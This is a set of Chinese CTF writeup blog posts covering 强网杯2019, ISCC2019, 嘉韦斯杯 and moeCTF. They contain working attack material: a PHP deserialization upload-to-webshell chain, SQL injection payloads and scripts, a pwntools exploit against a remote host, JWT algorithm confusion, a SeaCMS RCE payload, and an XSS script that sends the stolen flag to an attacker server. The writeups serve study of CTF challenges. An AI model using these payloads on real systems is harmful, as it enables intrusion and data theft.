[{"title":"强网杯2019部分Writeup","date":"2019-05-27T14:47:35.000Z","path":"2019/05/27/强网杯2019部分Writeup/","text":"upload正常注册登录进去是一个上传文件的页面，并且发现header cookie中多了一个user，是一段base64加密的序列化字符串。再上传页面试了一波上传文件的操作都没找到什么突破口。之后扫了扫网站目录发现了www.tar.gz文件。 审计网站源码，在&#x2F;application&#x2F;web&#x2F;controller&#x2F;下的Index.php发现反序列化的地方 在Profile.php文件中发现有一个copy操作可复制文件，可利用这一点来将我们上传的图片马改为php文件 12345678910111213141516171819202122232425262728public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125;&#125; 首先生成图片马 exp1： 1234567891011121314151617181920212223&lt;?phpnamespace app\\web\\controller;class Profile&#123; public $filename_tmp = &#x27;./upload/ddc98a6700dc0bc43925665763fcf036/f3ccdd27d2000e3f9255a7e3e2c48800.png&#x27;; public $filename = &#x27;./upload/ddc98a6700dc0bc43925665763fcf036/cryscat.php&#x27;; public $ext = 1; public $except = array(&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;);&#125;class Register&#123; public $checker; public $registed = 0; public function __construct()&#123; $this-&gt;checker = new Profile(); &#125;&#125;$a = new Register();$res = serialize($a);print($res);print(base64_encode($res));?&gt; pop链1: Register-&gt;__destruct—&gt; Register-&gt;checker-&gt;index()—&gt;Profile-&gt;__call—&gt;Profile-&gt;__get—&gt;upload_img()—&gt;copy exp2: 1234567891011121314151617181920212223&lt;?phpnamespace app\\web\\controller;class Profile&#123; public $filename_tmp = &#x27;./upload/ddc98a6700dc0bc43925665763fcf036/f3ccdd27d2000e3f9255a7e3e2c48800.png&#x27;; public $filename = &#x27;./upload/ddc98a6700dc0bc43925665763fcf036/cryscat.php&#x27;; public $ext = 1; public $index = &#x27;upload_img&#x27;;&#125;class Register&#123; public $checker; public $registed = 0; public function __construct()&#123; $this-&gt;checker = new Profile(); &#125;&#125;$a = new Register();$res = serialize($a);print($res);print(base64_encode($res));?&gt; pop链2: Register-&gt;__destruct—&gt; Register-&gt;checker-&gt;index()—&gt;Profile-&gt;__call—&gt;upload_img()—&gt;copy 复制base64部分替换cookie中user的值，直接刷新页面即可 图片马重命名成功 高明的黑客主页直接提示了www.tar.gz文件，解压下来有三千多个php文件……大致翻看了几个文件感觉这一题就是单纯的找后门。遍历文件，将每个文件的GET或者POST方式获得的参数名提取出来，赋值爆破出后门密码。这里我选取了代码执行和命令执行都通用的echo命令。 python脚本 12345678910111213141516171819202122232425262728293031323334353637383940import osimport reimport requests as rfiles = os.listdir(&#x27;/Library/WebServer/Documents/src/&#x27;)method = re.compile(r&quot;\\$_[GEPOST]&#123;3,4&#125;\\[.*\\]&quot;)flag = 0for i in files: content = open(&#x27;/Library/WebServer/Documents/src/&#x27;+i,&#x27;r&#x27;).read() print(&#x27;*&#x27;*20+i+&#x27;*&#x27;*20) gepost = method.findall(content) url = &#x27;http://127.0.0.1/src/&#x27; cmd = &#x27;=echo &quot;cryscat&quot;;&#x27; for j in gepost: if &#x27;GET&#x27; in j: pdget = re.findall(r&quot;&#x27;(.*)&#x27;&quot;,j)[0] urlg = url+i+&#x27;?&#x27;+pdget+cmd res = r.get(urlg) print(&#x27;------&gt; &#x27;+pdget) if &#x27;cryscat&#x27; in res.text: print(&#x27;Success!!! ------&gt; &#x27;+urlg) flag = 1 break if &#x27;POST&#x27; in j: pdpost = re.findall(r&quot;&#x27;(.*)&#x27;&quot;,j)[0] data = &#123; pdpost:cmd &#125; urlp = url+i res = r.post(urlp,data=data) print(&#x27;------&gt; &#x27;+pdpost) if &#x27;cryscat&#x27; in res.text: print(&#x27;Success!!! ------&gt; &#x27;+urlp+&#x27; &#x27;+data) flag = 1 break if flag == 1: break 结果 另外本题还可以用vld插件提取每一个文件的opcode，最终只会看到一个动态函数执行，这就是后门文件 随便注本题一开始我注出了表名supersqli，后续测试发现： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 禁用了select确实不是一个常规的sql注入……可堆叠注入： 1’;show tables; 1’;show create table `1919810931114514` 可见flag就在1919810931114514表中，但是该怎么查出内容呢。主页的查询是按id在words表中进行字段内容查询的，根据这一点我们可以将flag所在的表名改为words，由此查出flag（注意此时flag所在表也需要存在id列） payload: 1’;alter table `1919810931114514` add id int default ‘1’;alter table words rename test;alter table `1919810931114514` rename words; -—————————————————————————–以下姿势来自Mochazz师傅预编译构造带有 select 的 sql 语句 1’;Set @sql&#x3D;concat(‘sel’,’ect * from 1919810931114514‘); prepare presql from @sql; execute presql; deallocate prepare presql;(Set大写绕过strstr) 强网先锋-上单发现&#x2F;1&#x2F;runtime&#x2F;log&#x2F;201903&#x2F;12.log日志文件中存在th5远程代码执行的payload，猜测本题是通过此payload getshell 强网先锋-APexp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./task_main&quot;)#e = ELF(&#x27;./task_main&#x27;)p = remote(&#x27;117.78.60.139&#x27;, &#x27;31278&#x27;)def getT(size, name): p.recvuntil(&quot;Choice &gt;&gt; \\n&quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&quot;name:\\n&quot;) p.sendline(str(size)) p.recvuntil(&quot;name:\\n&quot;) p.sendline(name)def changeT(index, size, name): p.recvuntil(&quot;Choice &gt;&gt; \\n&quot;) p.sendline(&#x27;3&#x27;) p.recvuntil(&quot;name?\\n&quot;) p.sendline(str(index)) p.recvuntil(&quot;name:\\n&quot;) p.sendline(str(size)) p.recvuntil(&quot;name:\\n&quot;) p.send(name) p.recvuntil(&quot;name!&quot;)def openT(index): p.recvuntil(&quot;Choice &gt;&gt; \\n&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;open?\\n&quot;) p.sendline(str(index))getT(10, &#x27;123&#x27;)getT(10, &#x27;/bin/sh&#x27;)changeT(0, 50, &#x27;a&#x27;*32)openT(0)p.recvuntil(&#x27;a&#x27;*32)binsh = puts = u64(p.recv(6)+&#x27;\\x00\\x00&#x27;)print hex(binsh)changeT(0, 50, &#x27;a&#x27;*40)openT(0)p.recvuntil(&#x27;a&#x27;*40)puts = u64(p.recv(6)+&#x27;\\x00\\x00&#x27;)libc = puts-0x6F690print hex(libc)system = libc+0x45390changeT(0, 100, &#x27;a&#x27;*32+p64(binsh)+p64(system))openT(1)p.interactive() 强网先锋-AD跟进加密函数，发现是base64加密此语句相当于v4 i ≠ v5 i,所以是从v5开始对比 从v5开始提出字符，解密获得flag 强网先锋-辅助脚本： 1234567891011121314151617from gmpy2 import *from Crypto.Util.number import bytes_to_long,long_to_bytese=mpz(65537)c1=mpz(2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597)n1=mpz(14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727)c2=mpz(3829060039572042737496679186881067950328956133163629908872348108160129550437697677150599483923925798224328175594483217938833520220087230303470138525970468915511111320396185482564783975435346354440035776909781158407636044986403819840648379609630039348895415045723208843631191252142600667607807479954194447237061080618370787672720344741413537975922184859333432197766580150534457001196765621678659952108010596273244230812327182786329760844037149719587269632133595149294067490955644893402708720284179715002149224068928828656515326446881791228638008572889331511945042911372915003805505412099102954073299010951896955362470)n2=mpz(14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979)m2=mpz(bytes_to_long(&quot;1&quot;*32))q=gcd(n1,n2)p1=n1/qr1=(p1-1)*(q-1)d1=invert(e,r1)m=pow(c1,d1,n1)print(long_to_bytes(m)) 强网先锋-打野附件是一张bmp图片，LSB隐写可通过LSB_hide工具直接提取出信息 也可以用zsteg","comments":true,"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.cryscat.com/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"强网杯","slug":"强网杯","permalink":"http://www.cryscat.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}]},{"title":"ISCC2019 Web Writeup","date":"2019-05-22T13:19:29.000Z","path":"2019/05/22/ISCC2019-Web-Writeup/","text":"web1代码审计 1234567891011121314151617&lt;?phperror_reporting(0);require &#x27;flag.php&#x27;;$value = $_GET[&#x27;value&#x27;];$password = $_GET[&#x27;password&#x27;];$username = &#x27;&#x27;;for ($i = 0; $i &lt; count($value); ++$i) &#123; if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &#x27;w3lc0me_To_ISCC2019&#x27; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; echo &#x27;Hello &#x27;.$username.&#x27;!&#x27;, &#x27;&lt;br&gt;&#x27;, PHP_EOL; echo $flag, &#x27;&lt;hr&gt;&#x27;; &#125;&#125;highlight_file(__FILE__); 首先要求我们传入的数组value经过chr函数转为ascii拼接后构成w3lc0me_To_ISCC2019字符串，但$value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127部分代码限制了数组的键值的范围，这就与构成字符的要求矛盾。这时候可以利用chr()函数的自动取模功能进行绕过，当参数大于256时，chr函数会对输入的数字自动取模256，所以我们在原数组上每个键值增加256就行了。 最后一个if语句看似很矛盾intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)。给intval()传入十六进制字符串或者科学计数法表示的字符串时，intval会出错为0。但+1后intval参数已经转换为十进制数字，可绕过if判断。 payload:?value[0]&#x3D;375&amp;value[1]&#x3D;307&amp;value[2]&#x3D;364&amp;value[3]&#x3D;355&amp;value[4]&#x3D;304&amp;value[5]&#x3D;365&amp;value[6]&#x3D;357&amp;value[7]&#x3D;351&amp;value[8]&#x3D;340&amp;value[9]&#x3D;367&amp;value[10]&#x3D;351&amp;value[11]&#x3D;329&amp;value[12]&#x3D;339&amp;value[13]&#x3D;323&amp;value[14]&#x3D;323&amp;value[15]&#x3D;306&amp;value[16]&#x3D;304&amp;value[17]&#x3D;305&amp;value[18]&#x3D;313&amp;password&#x3D;0xbbb web2打开链接是一个登录界面，要我们爆破admin的三位数密码。主要难点是绕过验证码，这道题的验证码生成是基于cookie的。将phpsessid清空就可绕过验证码直接进行密码爆破 web3一道二次注入，注册admin&#39;***#形式的用户名，密码随意，然后登进去修改密码，此时修改的密码即为admin的密码，登录admin getflag。猜测修改密码部分后台代码update users set password=&#39;?&#39; where username=&#39;?&#39; web4又一道代码审计 123456789101112131415161718192021222324&lt;?php error_reporting(0); include(&quot;flag.php&quot;); $hashed_key = &#x27;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#x27;; $parsed = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]); if(isset($parsed[&quot;query&quot;]))&#123; $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL)&#123; $action = $parsed_query[&#x27;action&#x27;]; &#125; if($action===&quot;auth&quot;)&#123; $key = $_GET[&quot;key&quot;]; $hashed_input = hash(&#x27;sha256&#x27;, $key); if($hashed_input!==$hashed_key)&#123; die(&quot;&lt;img src=&#x27;cxk.jpg&#x27;&gt;&quot;); &#125; echo $flag; &#125; &#125;else&#123; show_source(__FILE__); &#125;?&gt; 看到parse_str函数，变量覆盖的老朋友了。。。随便给key赋个值，然后将key sha256加密后的值覆盖变量hashed_key的值 payload?&#x2F;?action&#x3D;auth&amp;key&#x3D;1&amp;hashed_key&#x3D;6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b web5感觉有点脑洞啊……主页说我不是Union.373的成员（虽然我确实不是）,很长一段时间没找到突破口。最后在User-Agent后加上Union.373就进去了。嗯？？？ 接着要我们输入用户名和密码，直接postusername=admin&amp;password=admin得到提示：flag为成员的密码通过payloadusername=&#39;\\*/\\*&amp;password=*/&#39;可以得到成员的用户名，然后进行注入脚本： 1234567891011121314151617181920212223242526272829303132#coding = utf-8import binasciiimport requestsurl = &quot;http://39.100.83.188:8054/&quot;def http_get(payload): str_16 = binascii.b2a_hex(payload.encode(&#x27;utf-8&#x27;)) payload = &quot;username=union_373_Tom&#x27; union all select 1,2,0x&quot; + str_16.decode() + &quot; /*&amp;password=*/ order by 3,2,&#x27;1&quot; headers = &#123; &#x27;user-agent&#x27;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36Union.373&quot;, &#x27;Content-Type&#x27;: &quot;application/x-www-form-urlencoded&quot; &#125; response = requests.post(url, data=payload, headers=headers) response.encoding = &#x27;utf-8&#x27; if &#x27;组织欢迎你，2!&#x27; in response.text: return False else: return Trueflag = &#x27;&#x27;while True: for i in range(33,127): temp_str=chr(i) print(&#x27;\\rflag--&gt;&#x27;+flag+temp_str,end=&#x27;&#x27;,flush=True) if http_get(flag + temp_str): break if temp_str==chr(33): break flag += chr(ord(temp_str) - 1) web6老规矩先注册，再登录。登上去发现header中多了这么个玩意儿 iscc99后面是一段JWT，猜测本题是考JWT攻击。到https://jwt.io解一下 发现网页中有这样一个接口 末尾处是一段公钥加密代码 123456function getpubkey()&#123; /* get the pubkey for test /pubkey/&#123;md5(username+password)&#125; */&#125; 依据此加密方式可知我的公钥地址：/pubkey/a3cd2d4c60cad6118c24e081238c007e（账号密码均为cryscat）得到公钥： —–BEGIN PUBLIC KEY—–\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk&#x2F;PK\\nomh6laVF+c3+D+klIjXglj7+&#x2F;wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm&#x2F;NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V&#x2F;mpyKe9R3wIDAQAB\\n—–END PUBLIC KEY—– RS256算法使用私钥对消息进行签名并使用公钥进行身份验证，而HS256算法使用密钥为所有消息进行签名和验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。所以在这里我们考虑将RS256算法改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）来达到pubkey任意访问的目的。 将priv改为admin,加密脚本： 123import jwtpubkey = &#x27;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY-----&#x27;print(jwt.encode(&#123;&quot;name&quot;: &quot;cryscat&quot;,&quot;priv&quot;: &quot;admin&quot;&#125;, key=pubkey, algorithm=&#x27;HS256&#x27;)) 得到我们的可利用JWT 换上这段JWT去访问list可以看到很多用户留下的链接 common.js接口中给出了链接信息的查看方式 1234567891011121314151617181920212223242526function getlist()&#123; token = window.localStorage.getItem(&quot;token&quot;); if (token==null||token==undefined)&#123; alert(&quot;u must login first&quot;); window.location.href = &quot;/&quot;; return; &#125; auth = &quot;iscc19 &quot; + token; $.ajax(&#123; url: &#x27;/list&#x27;, type: &#x27;GET&#x27;, headers:&#123;&quot;Authorization&quot;:auth&#125;, &#125;) .success(function(data) &#123; result = data.result; if(result)&#123; content = &quot;the user &quot; + data.username +&quot; has these links:\\n&quot;; for (var i in data.links)&#123; content = content + &quot;/text/&quot; + data.links[i] + &quot;\\n&quot;; &#125; alert(content); &#125;else&#123; alert(&quot;list fail&quot;); &#125; &#125;); &#125; 其中有一条是admin的，应该就是flag的所在之处了，即访问/text/admin:22f1e0aa7a31422ad63480aa27711277getflag","comments":true,"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.cryscat.com/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"ISCC","slug":"ISCC","permalink":"http://www.cryscat.com/tags/ISCC/"},{"name":"Web","slug":"Web","permalink":"http://www.cryscat.com/tags/Web/"}]},{"title":"一次有趣的XSS弹弹乐","date":"2019-04-08T13:20:32.000Z","path":"2019/04/08/一次有趣的XSS弹弹乐/","text":"这是标题(๑¯∀¯๑)主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf &lt;SCRIPT&gt;alert(1)&lt;SCRIPT&gt; 但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf 访问接口需要进行referer验证 flag是通过getflag接口获取的，需要参数是csrftoken 获取ﬂag的权限是通过 jsonp 中的 username验证的 ，这个 username 是后端解密 cookie 中的username 得到的明文。cookie 中的 username 受 http-only 保护不可读取，也没有能显示出 cookie 中加密的 username 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了 这时候的攻击思路就比较明确了：site填入http://xxxx/action.php?callback=\\&lt;js代码&gt;让admin访问这个url触发XSS获取自己的csrftoken值，然后带着这个值访问getflag接口，最后再将flag内容发送到我们的服务器。但是又遇到一个问题：site可填入的url长度太短了，根本不可能填入这样一个附带JS脚本的url，那只能另辟蹊径了 另一条攻击链： 链接 –&gt; 302跳转到 jsonp xss –&gt; 提取 jsonp 中 csrftoken –&gt; xhr 控制读取 flag –&gt; 返回flag到服务器 site:http://my_ip/xss.phpxss.php: 123&lt;?phpheader(&#x27;Location: http://target_ip/action.php?callback=&lt;script+src=&quot;http://my_ip/xss.js&quot;&gt;&lt;/script&gt;&#x27;);?&gt; HTTP_REFERER 是由 html 文档对象 document 提供的,Location 是 http 协议的头部内容,浏览器一旦收到，就执行了,此时 document 尚未创建,所以此时的referer还是http://target_ip/loged.php xss.js: 123456789window.onload = function cryscat()&#123; var obj = eval(&#x27;(&#x27;+document.body.innerText+&#x27;)&#x27;); var ct = obj.csrftoken; var xml = new XMLHttpRequest(); xml.open(&#x27;Get&#x27;,&#x27;http://target_ip/getflag.php?csrftoken=&#x27;+ct,false); xml.send(); var res = xml.responseText; window.open(&#x27;http://my_ip/?msg=&#x27;+res);&#125; 最后返回的data: {‘flag’:’flag{j50nP_1s_VulN3r4bLe}’,’csrftoken’:’058807fed91d1b8807688bd258710cbe’} IP: 111.198.29.45 Referer: http://111.198.29.45:30987/action.php? callback&#x3D;%3Cscript+src&#x3D;%22http://my_ip/xss.js%22%3E%3C%2Fscript%3E Thank you for reading.(・ω&lt;)","comments":true,"tags":[{"name":"XSS","slug":"XSS","permalink":"http://www.cryscat.com/tags/XSS/"},{"name":"Trick","slug":"Trick","permalink":"http://www.cryscat.com/tags/Trick/"},{"name":"Note","slug":"Note","permalink":"http://www.cryscat.com/tags/Note/"},{"name":"CTF","slug":"CTF","permalink":"http://www.cryscat.com/tags/CTF/"}]},{"title":"嘉韦斯杯Writeup","date":"2019-04-01T15:38:32.000Z","path":"2019/04/01/嘉韦斯杯Writeup/","text":"壹一道SQL注入题，直接上sqlmap跑 贰打开链接，主页是一长串字符，base64解密，解出来是一段JSfuck编码，直接丢进浏览器的控制台，出flag 叁主页是一串十六进制的运算式，题目说要我们2秒内计算出结果并提交，所以这一题要靠脚本解决（正则表达式不会写，在正则表达式网站试了试，得出了能将式子全都提取出来的正则表达式，之后再进行一个式子截取，去掉其他无关字符）脚本： 123456789101112import requestsimport reurl = &#x27;http://47.103.43.235:82/web/a/index.php&#x27;r = requests.session()res = r.get(url).textcont = re.findall(&#x27;-?[0-9xABCDEF]\\d*[\\+\\-\\*\\%\\^/( )]*&#x27;,res)cont = &quot;&quot;.join(cont)resu = eval(cont[1:59])data = &#123;&#x27;result&#x27;:resu&#125;ans = r.post(url,data = data)print(ans.text) 赛后专门琢磨了html内容提取，本体还可以用str.split(&quot;&lt;p&gt;&quot;)和str.split(&quot;&lt;/p&gt;&quot;)进行截取，截取方式不唯一，自己喜欢的才是最好的┓( ´-&#96; )┏ 肆打开链接是一张二维码图片，保存到本地，用binwalk分离出其中的压缩包 压缩包中有一个key.txt文件，flag应该就在里面了，解压发现需要密码，首先尝试伪加密破解，无果，应该是实打实的加密了，开始爆破密码，爆出密码：674290437，查看key.txt获得flag 伍神奇的密码1 又是一长串的字符，看出是base64，进行解密，又是一层base64，其中解出的base64编码的&#x3D;都是%3D表示的。要将这部分url编码换成&#x3D;再进行解码。最后解出得到fB__l621a4h4g_ai%7B%26i%7D将其中的url编码解码得到fB__l621a4h4g_ai{&amp;i}可以看到这像是一段打乱顺序的flag，试试栅栏密码、凯撒密码和列移位密码最终在栅栏密码5字一组的时候试出flag{B64_&amp;_2hai_14i} 陆神奇的密码2 题目给了一串字符：bg[`sZ*Zg’dPfP`VM_SXVd密码学的题，没多大头绪，规律是学长找出来的脚本： 12345678str=&#x27;bg[`sZ*Zg\\&#x27;dPfP`VM_SXVd&#x27;strlen=len(str)i=3flag=&#x27;&#x27;for c in str: i=i+1 flag=flag+chr(ord(c)+i)print(flag) 柒又是一道SQL注入题，这题鼓捣了好久！ 经过测试发现id&#x3D;后面是以base64加密逆序输入的，过滤了or、=、”、&#39;、union、select，并且不需要闭合引号 爆库：0&#x2F;**&#x2F;uunionnion&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;1,2,3,4,5,database()#&#x3D;MSKoU2chJWY0FGZsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆表：0&#x2F;**&#x2F;uunionnion&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;1,2,3,4,5,table_name&#x2F;**&#x2F;from&#x2F;**&#x2F;infoorrmation_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;database()#&#x3D;owIpgSZzFmYhRXYk9iKq8SZrlGbvoiKvEWblh2Yz9VZsJWY09iKq8SZyVGa39iKq8yclxmYhRnLh1WZoN2cf52bpRXYtJncv9mZul2LqoyLt9mcm9iKq8SZtFmbfVGbiFGdsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 爆列：0&#x2F;**&#x2F;uunionnion&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;1,2,3,4,5,column_name&#x2F;**&#x2F;from&#x2F;**&#x2F;infoorrmation_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;0x666C6167 #&#x3D;MCI3YTM2MkN2YDew8iKq8SZrlGbvoiKvUWbh52XlxmYhR3LqoyLlJXZod3LqoyLz5Wb1x2bj5SYtVGajN3Xu9Wa0FWbyJ3bvZmbp9iKq8SbvJnZvoiKvUWbh52Xu1Wds92YsUDL0wyMsIDLx8iKq8CdjVGdjVGblNHblN3LqoyLu9Wau52bp5Wd19iKq8CM 最后payload：0&#x2F;**&#x2F;uniunionon&#x2F;**&#x2F;seselectlect&#x2F;**&#x2F;1,2,3,4,5,flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag#jcWYsZ2LqoyLt9mcm9iKq8yZhxmZsUDL0wyMsIDLx8iKq8CdjVGb0NWZsV2clN3LqoyLu9mbvlmb1lmb19iKq8CM 捌上Kali的openssl，其中e就是exponent的值，转成十进制： 将解出的这串数字进行因式分解http://factordb.com 最后用python脚本进行解密： 1234567891011#coding:utf-8 import gmpy import rsa p = 273821108020968288372911424519201044333q = 280385007186315115828483000867559983517n = 76775333340223961139427050707840417811156978085146970312315886671546666259161e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;fllllllag.txt&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 玖seacms 这道题是直接利用海洋CMS 6.45版本前台getshell漏洞的payload打下来的Payload： searchtype&#x3D;5&amp;searchword&#x3D;{if{searchpage:year}&amp;year&#x3D;:e{searchpage:area}}&amp;area&#x3D;v{searchpage:letter}&amp;letter&#x3D;al{searchpage:lang}&amp;yuyan&#x3D;(join{searchpage:jq}&amp;jq&#x3D;($_P{searchpage:ver}&amp;ver&#x3D;OST[9]))&amp;9[]&#x3D;sy&amp;9[]&#x3D;stem(‘cat ..&#x2F;..&#x2F;flag.txt’); 拾查看源代码获得提示index.phps，得到主页源代码 1234567891011&lt;?phperror_reporting(0);$flag = &#x27;********&#x27;;if (isset($_POST[&#x27;name&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; if ($_POST[&#x27;name&#x27;] == $_POST[&#x27;password&#x27;]) print &#x27;name and password must be diffirent&#x27;; else if (sha1($_POST[&#x27;name&#x27;]) === sha1($_POST[&#x27;password&#x27;])) die($flag); else print &#x27;invalid password&#x27;;&#125;?&gt; 题目的关键点是name和password传入的内容要不同并且name和password的sha1值类型和内容都相同。那么就是主要考虑sha1对比的绕过。sha1函数要求传入的参数是字符串类型，那传入两个比如数组类型，结果就都是false,这样就会输出flag了 拾壹查看网页源代码 这道题上来首先就将我们传入的param1和param2类型转化为string，所以是不能通过数组绕过了。直接在网上搜了这样的两个值post上去： 后记这次比赛一共15道题，有四道没做出来，两道脑洞题，两道逆向（逆向真不是谁都能玩的啊！）。其中有一道希尔密码的题花的时间最多（关于希尔密码的加密解密有兴趣的同学可以自行百度，这里不再赘述），脚本是历经千辛万苦找到了，但最后flag还是不对……于是我去问了主办方，主办方说是这题有脑洞！！！行吧！希尔密码解密脚本： 1234567891011121314151617181920212223242526272829303132333435Ma=[ 1,4,7, 2,5,8, 3,6,10 ]code=[ 23,10,12, 24,16,2, 25,3,9, 0,9,5 ]answer=[]flag = 0for t in range(0,12,3): flag = 0 for i in range(0,99,1): for j in range(0,99,1): for k in range(0,99,1): if ((1*i + 4*j + 7*k)%26 == code[t] and (2*i + 5*j + 8*k)%26 == code[t+1] and (3*i + 6*j + 10*k)%26 == code[t+2]): answer.append(i) answer.append(j) answer.append(k) flag = 1 break if(flag): break if(flag): break if(flag): continueprint (answer)for i in answer: print (chr(i + 97),end=&quot;&quot;) 其中Ma是加密矩阵的逆矩阵，code是密文各字母对应的数字编码 比赛陆陆续续开始多起来了，好好加油吧！菜就是原罪！","comments":true,"tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"嘉韦斯","slug":"嘉韦斯","permalink":"http://www.cryscat.com/tags/%E5%98%89%E9%9F%A6%E6%96%AF/"},{"name":"华东师范大学","slug":"华东师范大学","permalink":"http://www.cryscat.com/tags/%E5%8D%8E%E4%B8%9C%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6/"}]},{"title":"西北大学moeCTF-Web","date":"2019-03-10T12:10:14.000Z","path":"2019/03/10/西北大学moeCTF-Web/","text":"前言好久之前找到的一个CTF平台，今天偶然翻了出来，web部分还剩几道题，顺便刷掉吧…… 机器人很明显是robots协议 http://47.93.187.174/nwuctf/robots.txt 直接访问此文件得到flag nwuctf{robots_is_NOT_RobotQAQ} 让我们来弹一个flag根据题目意思，那就弹一个flag，在输入框输入&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;得到flag php弱类型查看源代码 12345678910&lt;/?php$s = $_GET[&#x27;s&#x27;];$a = &#x27;QNKCDZO&#x27;;$md5a = md5($a);$md5s = md5($s);if($s != $a &amp;&amp; $md5a == $md5s)&#123; echo $flag;&#125;else&#123; echo &#x27;try again&#x27;;&#125; 